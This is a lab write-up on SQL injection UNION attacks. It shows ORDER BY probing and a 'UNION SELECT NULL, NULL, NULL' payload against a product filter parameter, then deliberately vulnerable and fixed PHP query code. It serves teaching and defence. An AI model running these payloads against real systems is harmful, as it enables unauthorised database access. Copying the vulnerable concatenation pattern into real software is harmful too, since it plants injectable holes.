# Lab: SQL injection UNION attack, determining the number of columns returned by the query

## 1. Vulnerability Discovery & Structural Mapping (The Analysis)
* **Target Endpoint / Parameter:** `/filter?category=Gifts`
* **Vulnerability Type:** Server-Side (SQL Injection - Structural Enumeration)
* **Objective:** Map out the exact structural column width of the backend database query layout to prime a future `UNION`-based data exfiltration attack.

### Step 1: Incremental Boundary Testing via ORDER BY
To locate the exact structural width of the original query array, I used the `ORDER BY` clause to increment column index numbers until the backend crashed:
* `category=Gifts' ORDER BY 1-- ` -> HTTP 200 OK
* `category=Gifts' ORDER BY 2-- ` -> HTTP 200 OK
* `category=Gifts' ORDER BY 3-- ` -> HTTP 200 OK
* `category=Gifts' ORDER BY 4-- ` -> HTTP 500 Internal Server Error

**Deduction:** Because ordering by index 4 caused a database exception (sorting by a column layout that does not exist), the query architecture is proven to expect exactly **3 columns**.

## 2. Exploitation (The Hack)
* **Payload Used:** `' UNION SELECT NULL, NULL, NULL-- `
* **Full URL Encoded Input:** `/filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL--+`
* **Mechanism:** 
  1. The single quote (`'`) terminates the original category data context string.
  2. The `UNION` operator instructs the database engine to append a new result layout structure to the output buffer.
  3. The payload inputs exactly three `NULL` placeholder arguments side-by-side. This matches the 3-column structural layout rule perfectly without triggering data type conflicts.
  4. The comment operator (`-- `) strips the remaining developer query code lines to prevent processing failures.
* **Result:** The database executed the combined structure cleanly, outputting a valid server response and confirming absolute alignment with the query schema.

## 3. Remediation (The Fix)
* **Flawed Concept:** The application drops unfiltered client text strings directly into the executable structural layer of the database query.
* **The Correction:** Completely decouple query parameters from runtime query execution steps by migrating the database logic to **Prepared Statements (Parameterized Queries)**.

### Vulnerable Code Example (Conceptual PHP Agency Context)
```php
// Vulnerable: Direct input stitching allows external code strings to alter SQL structural logic
\$category = \$_GET['category'];
\$query = "SELECT id, name, description FROM products WHERE category = '" . \$category . "'";
\$result = \$db->query(\$query);
```

### Secure Remediation Example (Parameterized Validation)
```php
// Secure: Pre-compiling the SQL command string completely neutralizes execution changes
\$category = \$_GET['category'];
\$stmt = \$db->prepare('SELECT id, name, description FROM products WHERE category = :category');
\$stmt->execute(['category' => \$category]);
\$products = \$stmt->fetchAll();
```
